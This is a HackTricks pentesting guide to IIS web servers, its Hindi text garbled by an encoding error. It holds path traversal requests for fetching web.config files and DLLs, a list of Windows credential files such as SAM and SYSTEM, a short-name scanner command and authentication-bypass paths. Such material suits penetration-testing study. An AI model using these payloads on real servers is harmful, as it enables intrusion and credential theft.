# IIS - рдЗрдВрдЯрд░рдиреЗрдЯ рд╕реВрдЪрдирд╛ рд╕реЗрд╡рд╛рдПрдВ

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

рдкрд░реАрдХреНрд╖рдг рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓ рдлрд╝рд╛рдЗрд▓ рдПрдХреНрд╕рдЯреЗрдВрд╢рди:

* asp
* aspx
* config
* php

## рдЖрдВрддрд░рд┐рдХ рдЖрдИрдкреА рдкрддрд╛ рдлрд╛рд╕рд▓рд╛

рдХрд┐рд╕реА рднреА IIS рд╕рд░реНрд╡рд░ рдкрд░ рдЬрд╣рд╛рдВ рдЖрдкрдХреЛ 302 рдорд┐рд▓рддрд╛ рд╣реИ, рд╡рд╣рд╛рдВ рдЖрдк Host рд╣реЗрдбрд░ рдХреЛ рд╣рдЯрд╛рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ HTTP/1.0 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЗ рдЕрдВрджрд░ Location рд╣реЗрдбрд░ рдЖрдкрдХреЛ рдЖрдВрддрд░рд┐рдХ рдЖрдИрдкреА рдкрддрд╛ рдкрд░ рдкрд╣реБрдВрдЪрд╛ рд╕рдХрддрд╛ рд╣реИ:
```
nc -v domain.com 80
openssl s_client -connect domain.com:443
```
рдЖрдВрддрд░рд┐рдХ рдЖрдИрдкреА рдЬрд╛рдирдХрд╛рд░реА рдЙрдЬрд╛рдЧрд░ рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛:
```
GET / HTTP/1.0

HTTP/1.1 302 Moved Temporarily
Cache-Control: no-cache
Pragma: no-cache
Location: https://192.168.5.237/owa/
Server: Microsoft-IIS/10.0
X-FEServer: NHEXCHANGE2016
```
## рдлрд╝рд╛рдЗрд▓реЗрдВ .config рдлрд╝рд╛рдЗрд▓реЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ

рдЖрдк .config рдлрд╝рд╛рдЗрд▓реЗрдВ рдЕрдкрд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред рдЗрд╕реЗ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рддрд░реАрдХрд╛ рдлрд╝рд╛рдЗрд▓ рдХреЗ рдЕрдВрдд рдореЗрдВ рдХреЛрдб рдЬреЛрдбрд╝рдирд╛ рд╣реИ рдЬреЛ рдПрдЪрдЯреАрдПрдордПрд▓ рдЯрд┐рдкреНрдкрдгреА рдХреЗ рднреАрддрд░ рд╣реЛ: [рдпрд╣рд╛рдБ рдЙрджрд╛рд╣рд░рдг рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)

рдЗрд╕ рд╡рд┐рдХрд▓реНрдк рдХреЛ рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдФрд░ рдЗрд╕ рднреЗрджрднрд╛рд╡ рдХрд╛ рд╢реЛрдзрди рдХрд░рдиреЗ рдХреЗ рддрдХрдиреАрдХреЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА [рдпрд╣рд╛рдБ](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/)

## IIS рдбрд┐рд╕реНрдХрд╡рд░реА рдмреНрд░реВрдЯрдлрд╝реЛрд░реНрд╕

рдореИрдВрдиреЗ рдмрдирд╛рдпрд╛ рд╣реБрдЖ рд╕реВрдЪреА рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ:

{% file src="../../.gitbook/assets/iisfinal.txt" %}

рдпрд╣ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реВрдЪрд┐рдпреЛрдВ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рдорд┐рд▓рд╛рдХрд░ рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рдерд╛:

[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt)\
[http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html](http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html)\
[https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt](https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt)\
[https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt](https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt)

рдХрд┐рд╕реА рднреА рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЛ рдЬреЛрдбрд╝реЗ рдмрд┐рдирд╛ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ, рдЬрд┐рди рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ, рдЙрдирдореЗрдВ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рд╣реИред

## рдкрде рдЯреНрд░рд╛рд╡рд░реНрд╕рд▓

### рд╕реНрд░реЛрдд рдХреЛрдб рд▓реАрдХ

рдкреВрд░реА рд╡рд┐рд╡рд░рдг рдЬрд╛рдВрдЪреЗрдВ: [https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html](https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html)

{% hint style="info" %}
рд╕рд╛рд░рд╛рдВрд╢ рдХреЗ рд░реВрдк рдореЗрдВ, рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рдлрд╝реЛрд▓реНрдбрд░реЛрдВ рдореЗрдВ рдХрдИ web.config рдлрд╝рд╛рдЗрд▓реЗрдВ рд╣реИрдВ рдЬрд┐рдирдореЗрдВ "**assemblyIdentity**" рдлрд╝рд╛рдЗрд▓реЛрдВ рдФрд░ "**рдиреЗрдорд╕реНрдкреЗрд╕**" рдХрд╛ рд╕рдВрджрд░реНрдн рд╣реИред рдЗрд╕ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд╕рд╛рде **рдХрд╣рд╛рдБ рдирд┐рд╖реНрдкрд╛рджрдиреАрдп рд╕реНрдерд╛рди рд╣реИрдВ** рдФрд░ рдЙрдиреНрд╣реЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИред\
**рдбрд╛рдЙрдирд▓реЛрдб рдХрд┐рдП рдЧрдП Dlls** рд╕реЗ рдирдП **рдиреЗрдорд╕реНрдкреЗрд╕** рдвреВрдВрдврдиреЗ рдФрд░ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рдиреЗ рдЪрд╛рд╣рд┐рдП рдЬрд╣рд╛рдВ рдЖрдкрдХреЛ рдирдП рдиреЗрдорд╕реНрдкреЗрд╕ рдФрд░ assemblyIdentity рдкрд╛рдиреЗ рдХреЗ рд▓рд┐рдП web.config рдлрд╝рд╛рдЗрд▓ рдорд┐рд▓ рд╕рдХрддреА рд╣реИред\
рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдлрд╝рд╛рдЗрд▓реЗрдВ **connectionstrings.config** рдФрд░ **global.asax** рдореЗрдВ рджрд┐рд▓рдЪрд╕реНрдк рдЬрд╛рдирдХрд╛рд░реА рд╣реЛ рд╕рдХрддреА рд╣реИред

{% endhint %}

**.Net MVC рдПрдкреНрд▓рд┐рдХреЗрд╢рди** рдореЗрдВ, **web.config** рдлрд╝рд╛рдЗрд▓ рдиреЗ "assemblyIdentity" XML рдЯреИрдЧ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рджреНрд╡рд╛рд░рд╛ рдирд┐рд░реНрднрд░ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдкреНрд░рддреНрдпреЗрдХ рдмрд╛рдЗрдирд░реА рдлрд╝рд╛рдЗрд▓ рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдиреЗ рдХрд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рднреВрдорд┐рдХрд╛ рдирд┐рднрд╛рдИ рд╣реИред

### **рдмрд╛рдЗрдирд░реА рдлрд╝рд╛рдЗрд▓реЛрдВ рдХрд╛ рдЕрдиреНрд╡реЗрд╖рдг**

рдиреАрдЪреЗ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ **web.config** рдлрд╝рд╛рдЗрд▓ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХрд╛ рдПрдХ рдЙрджрд╛рд╣рд░рдг:
```markup
GET /download_page?id=..%2f..%2fweb.config HTTP/1.1
Host: example-mvc-application.minded
```
рдпрд╣ рдЕрдиреБрд░реЛрдз рд╡рд┐рднрд┐рдиреНрди рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдФрд░ рдЖрд╡рд╢реНрдпрдХрддрд╛рдУрдВ рдХреЛ рдкреНрд░рдХрдЯ рдХрд░рддрд╛ рд╣реИ, рдЬреИрд╕реЗ:

- **EntityFramework** рд╕рдВрд╕реНрдХрд░рдг
- **AppSettings** рд╡реЗрдмрдкреЗрдЬ, рдХреНрд▓рд╛рдЗрдВрдЯ рдорд╛рдиреНрдпрддрд╛, рдФрд░ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рд▓рд┐рдП
- рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдФрд░ рд░рдирдЯрд╛рдЗрдо рдХреЗ рд▓рд┐рдП **System.web** рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди
- **System.webServer** рдореЙрдбреНрдпреВрд▓ рд╕реЗрдЯрд┐рдВрдЧреНрд╕
- **Microsoft.Owin**, **Newtonsoft.Json**, рдФрд░ **System.Web.Mvc** рдЬреИрд╕реА рдХрдИ рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдХреЗ рд▓рд┐рдП **Runtime** рдПрд╕реЗрдореНрдмрд▓реА рдмрд╛рдЗрдВрдбрд┐рдВрдЧ

рдпреЗ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рд╕реБрдЭрд╛рддреА рд╣реИрдВ рдХрд┐ рдХреБрдЫ рдлрд╝рд╛рдЗрд▓реЗрдВ, рдЬреИрд╕реЗ **/bin/WebGrease.dll**, рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ /bin рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рд╕реНрдерд┐рдд рд╣реИрдВред

### **рд░реВрдЯ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдлрд╝рд╛рдЗрд▓реЗрдВ**

рд░реВрдЯ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рдкрд╛рдИ рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рдлрд╝рд╛рдЗрд▓реЗрдВ, рдЬреИрд╕реЗ **/global.asax** рдФрд░ **/connectionstrings.config** (рдЬрд┐рд╕рдореЗрдВ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдкрд╛рд╕рд╡рд░реНрдб рд╣реЛрддреЗ рд╣реИрдВ), рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдФрд░ рдкрд░рд┐рдЪрд╛рд▓рди рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реИрдВред

### **рдиреЗрдорд╕реНрдкреЗрд╕ рдФрд░ Web.Config**

MVC рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╡рд┐рд╢реЗрд╖ рдиреЗрдорд╕реНрдкреЗрд╕ рдХреЗ рд▓рд┐рдП рдЕрддрд┐рд░рд┐рдХреНрдд **web.config рдлрд╝рд╛рдЗрд▓реЗрдВ** рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рддреА рд╣реИрдВ рддрд╛рдХрд┐ рдкреНрд░рддреНрдпреЗрдХ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рджреЛрд╣рд░рд╛рд╡ рди рд╣реЛ, рдЬреИрд╕реЗ рдХрд┐рд╕реА рдФрд░ **web.config** рдХреЛ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрдиреБрд░реЛрдз рдХреЗ рд╕рд╛рде рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ:
```markup
GET /download_page?id=..%2f..%2fViews/web.config HTTP/1.1
Host: example-mvc-application.minded
```
### **DLLs рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛**

рдПрдХ рдХрд╕реНрдЯрдо рдиреЗрдорд╕реНрдкреЗрд╕ рдХрд╛ рдЙрд▓реНрд▓реЗрдЦ рдПрдХ DLL рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╕рдВрдХреЗрдд рджреЗрддрд╛ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдирд╛рдо "**WebApplication1**" рд╣реИ рдЬреЛ /bin рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рдореМрдЬреВрдж рд╣реИред рдЗрд╕рдХреЗ рдмрд╛рдж, **WebApplication1.dll** рдХреЛ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЕрдиреБрд░реЛрдз рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ:
```markup
GET /download_page?id=..%2f..%2fbin/WebApplication1.dll HTTP/1.1
Host: example-mvc-application.minded
```
рдпрд╣ рдЕрдиреНрдп рдорд╣рддреНрд╡рдкреВрд░реНрдг DLL рдХреА рдореМрдЬреВрджрдЧреА рдХрд╛ рд╕реБрдЭрд╛рд╡ рджреЗрддрд╛ рд╣реИ, рдЬреИрд╕реЗ **System.Web.Mvc.dll** рдФрд░ **System.Web.Optimization.dll**, /bin рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВред

рдПрдХ рд╕реНрдерд┐рддрд┐ рдореЗрдВ рдЬрд╣рд╛рдВ рдПрдХ DLL рдПрдХ рдиреЗрдорд╕реНрдкреЗрд╕ рдЖрдпрд╛рдд рдХрд░рддреА рд╣реИ рдЬрд┐рд╕реЗ **WebApplication1.Areas.Minded** рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ, рдПрдХ рд╣рдорд▓рд╛рд╡рддрд╛ рдЕрдиреНрдп web.config рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреА рдореМрдЬреВрджрдЧреА рдХрд╛ рдЕрдВрджрд╛рдЬрд╛ рд▓рдЧрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреИрд╕реЗ **/area-name/Views/**, рд╡рд┐рд╢реЗрд╖ рд╡рд┐рдиреНрдпрд╛рд╕ рдФрд░ /bin рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдЕрдиреНрдп DLL рдХреЛ рд╕рдВрджрд░реНрднрд┐рдд рдХрд░рддреЗ рд╣реБрдПред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, **/Minded/Views/web.config** рдкрд░ рдПрдХ рдЕрдиреБрд░реЛрдз рд╡рд╣рд╛рдБ рдЕрдиреНрдп DLL, **WebApplication1.AdditionalFeatures.dll** рдХреА рдореМрдЬреВрджрдЧреА рдХреА рд╕рдВрдХреЗрдд рджреЗрдиреЗ рд╡рд╛рд▓реЗ рд╡рд┐рдиреНрдпрд╛рд╕ рдФрд░ рдиреЗрдорд╕реНрдкреЗрд╕ рдЙрдЬрд╛рдЧрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

### рд╕рд╛рдорд╛рдиреНрдп рдлрд╝рд╛рдЗрд▓реЗрдВ

рд╕реЗ [рдпрд╣рд╛рдБ](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
```
C:\Apache\conf\httpd.conf
C:\Apache\logs\access.log
C:\Apache\logs\error.log
C:\Apache2\conf\httpd.conf
C:\Apache2\logs\access.log
C:\Apache2\logs\error.log
C:\Apache22\conf\httpd.conf
C:\Apache22\logs\access.log
C:\Apache22\logs\error.log
C:\Apache24\conf\httpd.conf
C:\Apache24\logs\access.log
C:\Apache24\logs\error.log
C:\Documents and Settings\Administrator\NTUser.dat
C:\php\php.ini
C:\php4\php.ini
C:\php5\php.ini
C:\php7\php.ini
C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache\logs\access.log
C:\Program Files (x86)\Apache Group\Apache\logs\error.log
C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
c:\Program Files (x86)\php\php.ini"
C:\Program Files\Apache Group\Apache\conf\httpd.conf
C:\Program Files\Apache Group\Apache\conf\logs\access.log
C:\Program Files\Apache Group\Apache\conf\logs\error.log
C:\Program Files\Apache Group\Apache2\conf\httpd.conf
C:\Program Files\Apache Group\Apache2\conf\logs\access.log
C:\Program Files\Apache Group\Apache2\conf\logs\error.log
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files\MySQL\my.cnf
C:\Program Files\MySQL\my.ini
C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
C:\Program Files\MySQL\MySQL Server 5.0\my.ini
C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
C:\Program Files\MySQL\MySQL Server 5.1\my.ini
C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
C:\Program Files\MySQL\MySQL Server 5.5\my.ini
C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
C:\Program Files\MySQL\MySQL Server 5.6\my.ini
C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
C:\Program Files\MySQL\MySQL Server 5.7\my.ini
C:\Program Files\php\php.ini
C:\Users\Administrator\NTUser.dat
C:\Windows\debug\NetSetup.LOG
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\php.ini
C:\Windows\repair\SAM
C:\Windows\repair\system
C:\Windows\System32\config\AppEvent.evt
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\system
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SecEvent.evt
C:\Windows\System32\config\SysEvent.evt
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\win.ini
C:\xampp\apache\conf\extra\httpd-xampp.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\FileZillaFTP\FileZilla Server.xml
C:\xampp\MercuryMail\MERCURY.INI
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\xampp\security\webdav.htpasswd
C:\xampp\sendmail\sendmail.ini
C:\xampp\tomcat\conf\server.xml
```
## HTTPAPI 2.0 404 рддреНрд░реБрдЯрд┐

рдпрджрд┐ рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддреНрд░реБрдЯрд┐ рджреЗрдЦрддреЗ рд╣реИрдВ:

![](<../../.gitbook/assets/image (446) (1) (2) (2) (3) (3) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (13).png>)

рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рд╕рд░реНрд╡рд░ **рд╕рд╣реА рдбреЛрдореЗрди рдирд╛рдо** рдХреЛ Host рд╣реЗрдбрд░ рдХреЗ рдЕрдВрджрд░ рдирд╣реАрдВ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ред\
рд╡реЗрдм рдкреГрд╖реНрда рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рд╕рд░реНрд╡рд┐рдд **SSL рдкреНрд░рдорд╛рдгрдкрддреНрд░** рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╢рд╛рдпрдж рдЖрдк рд╡рд╣рд╛рдВ рдбреЛрдореЗрди/рд╕рдмрдбреЛрдореЗрди рдирд╛рдо рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред рдпрджрд┐ рд╡рд╣рд╛рдВ рдирд╣реАрдВ рд╣реИ рддреЛ рдЖрдкрдХреЛ **рдмреНрд░реВрдЯ рдлрд╝реЛрд░реНрд╕ VHosts** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИ рдЬрдм рддрдХ рдЖрдк рд╕рд╣реА рд╡рд╛рд▓рд╛ рдирд╣реАрдВ рдорд┐рд▓ рдЬрд╛рддрд╛ред

## рдкреБрд░рд╛рдиреЗ IIS рд╕реБрд░рдХреНрд╖рд╛рджрд╛рдпрдХрддрд╛рдУрдВ рдореЗрдВ рдЦреЛрдЬ рдХрд░рдиреЗ рд▓рд╛рдпрдХ

### рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ IIS рдЯрд┐рд▓реНрдб рд╡рд░реНрдг тАЬ\~тАЭ рд╕реБрд░рдХреНрд╖рд╛рджрд╛рдпрдХрддрд╛/рд╕реБрд╡рд┐рдзрд╛ тАУ рдЫреЛрдЯрд╛ рдлрд╝рд╛рдЗрд▓/рдлрд╝реЛрд▓реНрдбрд░ рдирд╛рдо рднреЗрдж

рдЖрдк рдЗрд╕ **рддрдХрдиреАрдХ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рддреНрдпреЗрдХ рдкрд╛рдП рдЧрдП рдлрд╝реЛрд▓реНрдбрд░ рдХреЗ рднреАрддрд░ рдлрд╝реЛрд▓реНрдбрд░ рдФрд░ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреА **рдЧрдгрдирд╛** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдпрджрд┐ рдпрд╣ рдмреЗрд╕рд┐рдХ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ)ред\
рдЗрд╕ рддрдХрдиреАрдХ рдХреА рдореБрдЦреНрдп рд╕реАрдорд╛ рдпрджрд┐ рд╕рд░реНрд╡рд░ рд╡рдВрд░реНрдирд░рдмрд▓ рд╣реИ рддреЛ рдпрд╣ рд╣реИ рдХрд┐ **рдпрд╣ рдХреЗрд╡рд▓ рдкреНрд░рддреНрдпреЗрдХ рдлрд╝рд╛рдЗрд▓/рдлрд╝реЛрд▓реНрдбрд░ рдХреЗ рдирд╛рдо рдХреЗ рдкрд╣рд▓реЗ 6 рдЕрдХреНрд╖рд░ рдФрд░ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЗ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗ рдкрд╣рд▓реЗ 3 рдЕрдХреНрд╖рд░ рддрдХ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддрд╛ рд╣реИ**ред

рдЖрдк рдЗрд╕ рд╡рд░реНрдирд░рдмрд┐рд▓рд┐рдЯреА рдХреЗ рд▓рд┐рдП рдЯреЗрд╕реНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП [https://github.com/irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:`java -jar iis_shortname_scanner.jar 2 20 http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/`

![](<../../.gitbook/assets/image (183).png>)

рдореВрд▓ рд╢реЛрдз: [https://soroush.secproject.com/downloadable/microsoft\_iis\_tilde\_character\_vulnerability\_feature.pdf](https://soroush.secproject.com/downloadable/microsoft\_iis\_tilde\_character\_vulnerability\_feature.pdf)

рдЖрдк **metasploit** рднреА рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: `use scanner/http/iis_shortname_scanner`

### рдмреЗрд╕рд┐рдХ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдмрд╛рдпрдкрд╛рд╕

**рдмреЗрд╕рд┐рдХ рдкреНрд░рдорд╛рдгреАрдХрд░рдг** рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░реЗрдВ (**IIS 7.5**) рддрд╛рдХрд┐ рдЖрдк `/admin:$i30:$INDEX_ALLOCATION/admin.php` рдпрд╛ `/admin::$INDEX_ALLOCATION/admin.php` рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХреЗрдВред

